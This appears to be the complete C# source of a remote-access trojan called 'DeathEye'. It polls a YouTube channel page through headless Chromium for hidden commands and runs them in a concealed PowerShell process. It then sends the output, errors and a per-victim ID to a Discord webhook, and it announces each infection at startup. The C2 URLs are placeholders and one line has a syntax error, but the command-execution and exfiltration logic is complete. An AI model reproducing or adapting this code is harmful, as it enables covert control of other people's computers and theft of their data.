using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Collections.Specialized;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using PuppeteerSharp;
using System.Diagnostics;

namespace DeathEye
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]



        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static bool infected = false;
        public static string mysite = @"x";
        public static string image = @"https://live.staticflickr.com/3027/2969125628_4b03cfa3d3_w.jpg";
        public static string lastexecute = "";
        public static string PageData = "";
        public static string userID = GenerateUID.Gen();


        static void Main(string[] args)
        {
            ShowWindow(GetConsoleWindow(), 5);  //5 is show // 0 is hide

            startup();


            while (true)
            {
                string requet = CodeRequest.Request();
                if (requet == "skip" || requet == "Error" || requet == "")
                {
                    Thread.Sleep(160000);
                }
                else
                {
                    try
                    {
                        // Console.WriteLine("test");
                        string output = "";
                        string errors = "";
                         if (requet.Contains(userID))
                         {
                             requet = requet.Replace(userID, "");
                             Console.WriteLine("Executing : " + requet);
                             ProcessStartInfo startInfo = new ProcessStartInfo();
                             startInfo.FileName = @"powershell.exe";
                             startInfo.Arguments = @"& " + requet;
                             startInfo.RedirectStandardOutput = true;
                             startInfo.RedirectStandardError = true;
                             startInfo.UseShellExecute = false;
                             startInfo.CreateNoWindow = true;
                             Process process = new Process();
                             process.StartInfo = startInfo;
                             process.Start();

                              output = process.StandardOutput.ReadToEnd();

                              errors = process.StandardError.ReadToEnd();

                             Console.WriteLine("out: " + output);
                             Console.WriteLine("Errors: " + errors);
                         }
                         else
                         {
                             Console.WriteLine("Does not contain uid");
                         }


                        if (output != "")
                        {
                            using (dWebHook dcWeb = new dWebHook())
                            {
                                string msh = $">>> **OutPut** In Script \n{GenerateUID.Gen()} \n output: {output}";
                                dcWeb.WebHook = "replaceme";
                                dcWeb.SendMessage(msh);
                            }
                        }

                        if (errors != "")
                        {
                            using (dWebHook dcWeb = new dWebHook())
                            {
                                string msh = $">>> **Error** In Script \n{GenerateUID.Gen()} had an Error in the code. \nPlease fix the code. \n Error: {errors}";
                                dcWeb.WebHook = "replaceme";
                                dcWeb.SendMessage(msh);
                            }
                        }

                    }
                    catch (Exception ex)
                    {

                        using (dWebHook dcWeb = new dWebHook())
                        {
                            string msh = $">>> **Error** in Execution \n{GenerateUID.Gen()} had an Error in the code. \nPlease fix the code. \n Error: {ex.Message}";
                            dcWeb.WebHook = "replaceme";
                            dcWeb.SendMessage(msh);
                        }
                    }

                    lastexecute = requet;
                }
                Thread.Sleep(5500);

                Duplicated();
            }
            
        }

        public static bool Duplicated() 
        {
            string check = CodeRequest.Request();

            if (lastexecute == check)
            {
                Thread.Sleep(60000);
                Duplicated();
            }
            else
            {
                return false;
            }

            return true;
        }


        public static void startup()
        {
            string msg = $">>> Hello, {GenerateUID.Gen()} Has Started the Program.";
            string wurl = "replace me";
            using (dWebHook dcWeb = new dWebHook())
            {
                dcWeb.WebHook = wurl;
                dcWeb.SendMessage(msg);
            }

        }

        }



        public class CodeRequest
    {
        public static string Request() 
        {
                 string comstouid = "skip";
                try
                {
                        var uid = GenerateUID.Gen();
						// replace channel url
                        pagereadAsync(@"https://www.youtube.com/channel/x/about");

                        while (Program.PageData == "")
                        {
                            Thread.Sleep(1500);
                        }

                        string textt = Find(Program.PageData);
                        if (textt != null || textt != "")
                        {
                            comstouid = textt;
                            //Console.WriteLine("uid Command: " + comstouid);
                        }
                    
                }
                catch (Exception exception)
                {
                    Console.WriteLine("Error on UID command : " + exception.Message);
                    string msg = $">>> **Warning** \n{GenerateUID.Gen()} has not been given a code command execution. \nPlease add him to the list. \n Error: {exception.Message}";
                    string wurl = "replace me";
                    
                    using (dWebHook dcWeb = new dWebHook())
                    {
                        dcWeb.WebHook = wurl;
                        dcWeb.SendMessage(msg);
                    }

                return "Error";
                }
            return comstouid;
        }
        private WebClient webClient;
        public void Setup() { webClient = new WebClient(); }
        public static async Task<string> pagereadAsync(string url)
        {
            Console.WriteLine("faf");

            using var browserFetcher = new BrowserFetcher();
            await browserFetcher.DownloadAsync(BrowserFetcher.DefaultChromiumRevision);
            var browser = await Puppeteer.LaunchAsync(new LaunchOptions
            {
                Headless = true
            });
            var page = await browser.NewPageAsync();
            await page.GoToAsync(url);

            var content = await page.GetContentAsync();

            Console.WriteLine("page read done");
           // Console.WriteLine(content);
            //Thread.Sleep(1000111);
            Program.PageData = content;
            return content;
        }
        public static string Find(string page)
        {
            string resultt = "";


            try
            {
                int pFrom = page.IndexOf("content=\"xklx ") + "content=\"xklx " ".Length;
                int pTo = page.LastIndexOf(" xlkx");

                 resultt = page.Substring(pFrom, pTo - pFrom);


                Console.WriteLine("page result: ");
                Thread.Sleep(1500);
                Console.WriteLine(resultt);
                Thread.Sleep(2500);
            }
            catch (Exception exception)
            {
                Console.WriteLine("Error in string parse: " + exception.Message);
                string msg = $">>> **Error** \n{GenerateUID.Gen()} Error in string parse. \nPlease fix command string. \n Error: {exception.Message}";
                string wurl = "replace me";

                using (dWebHook dcWeb = new dWebHook())
                {
                    dcWeb.WebHook = wurl;
                    dcWeb.SendMessage(msg);
                }
                Thread.Sleep(5000);
                Console.WriteLine("page: " + page);
                return "Error";
            }

            return resultt;
        }

    }



    public class GenerateUID
    {
        public static string Gen()
        {
            string fdir = @"C:/temp";
            if (!Directory.Exists(fdir))
            {
                Directory.CreateDirectory(fdir);
            }
            if (!File.Exists(fdir + @"/uid.log"))
            {
                Random rand = new Random();
                int salt = rand.Next(1000000, 9999999);
                string genuid = "uid" + salt;
                File.WriteAllText(@"C:/temp/uid.log", genuid);
                return genuid;
            }

            return File.ReadAllText(@"C:/temp/uid.log");
        }
    }







    public class dWebHook : IDisposable
    {
        private readonly WebClient dWebClient;
        private static NameValueCollection discordValues = new NameValueCollection();
        public string WebHook { get; set; }
        public string UserName { get; set; }
        public string ProfilePicture = Program.image;


        public dWebHook()
        {
            dWebClient = new WebClient();
        }


        public void SendMessage(string msgSend)
        {
            discordValues.Add("username", UserName);
            discordValues.Add("avatar_url", ProfilePicture);
            discordValues.Add("content", msgSend);

            dWebClient.UploadValues(WebHook, discordValues);
            discordValues.Clear();
        }

        public void Dispose()
        {
            dWebClient.Dispose();
        }

    }

}
